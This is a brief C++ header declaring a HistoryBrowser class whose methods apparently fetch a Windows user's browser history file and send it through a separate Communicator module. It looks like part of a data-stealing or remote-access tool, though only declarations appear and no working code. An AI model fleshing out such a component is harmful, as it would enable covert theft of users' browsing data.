#pragma once
#include <Lmcons.h>
#include <fstream>
#include <iterator>
#include <vector>
#include "Communicator.h"

using namespace std;

class HistoryBrowser
{
public:
	HistoryBrowser();
	~HistoryBrowser();
	void sendHistory();

private:
	vector<unsigned char> getHistoryFile();
};
